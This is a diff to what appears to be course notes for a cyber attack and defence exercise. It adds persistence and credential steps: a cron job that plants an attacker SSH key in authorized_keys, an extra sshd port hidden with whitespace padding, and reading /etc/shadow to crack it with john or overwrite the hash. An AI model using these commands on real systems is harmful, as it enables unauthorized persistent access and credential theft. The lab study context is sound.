@@ -133,8 +133,21 @@ now on your kali machine, open a listener on the highportexit
 <div style="text-align: center;">
   <img src="{{ 'classes/cyberus/images/heard.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
 </div>
-<div class="terminal">* * * * * echo "ssh-rsa AAAA...attackerkey" &gt;&gt; /home/ubuntu/.ssh/authorized_keys</div>
 
+Schedule a cron job to place your rsa public key in the targets authorized_keys file
+<div class="terminal">* * * * * echo "ssh-rsa AAAA...attackerkey" &gt;&gt; /home/ubuntu/.ssh/authorized_keys</div>
+see Poralord for rsa key gen
+
+
+Add port to the sshd_config file
+<div class="terminal">sudo nano /etc/ssh/sshd_config</div>
+add a Port line with a new
+<div class="terminal">Port 2222</div>
+(push this new line off the page with spaces so nano doesnt pick it up)
+
+save out ctrl+x, y, enter
+restart the services
+<div class="terminal">sudo systemctl restart ssh</div>
 ---
 
 # Process Hunting & Removal
@@ -255,6 +268,28 @@ or just list usernames
 ## Change passwords
 
 <div class="terminal"> sudo passwd &lt;username&gt; </div>
+
+Dont know the password?
+
+Crack credentials on the device
+<div class="terminal"> sudo cat /etc/shadow</div>
+find the hash 
+<div class="terminal">ubuntu:$6$GeGHxfXw2Gpfum0n$/LAJZD7r5lPgL5dENGMP4BgH.fAQn/Dz4FAgV/o8h/GLp6WIUNkIQ8iLtlmLrNzvZclhCR2EAATDhIwDN2QeO0
+</div>
+copy and paste it into a file
+<div class="terminal"> nano crackme.txt</div>
+<div class="terminal"> john crackme.txt</div>
+
+OR 
+
+inject a new one
+<div class="terminal"> openssl passwd -6 muh-bran-new-password</div>
+<div class="terminal"> sudo nano /etc/shadow</div>
+replace the portion after ubuntu: and before the :19832:0:99999:7::: (password expiration data) with the new hash
+<div class="terminal"> $6$Xy9NP9YQsaJyUVoF$K85YHQOwtj0nh2anmKqzkoJHViNFmCKI6gPxDGuUKYwczwSZOxnaHT97/Kefy.vlcFlQ.3IUvtgb06DAYu78o/
+</div>
+
+
 
 ---
 
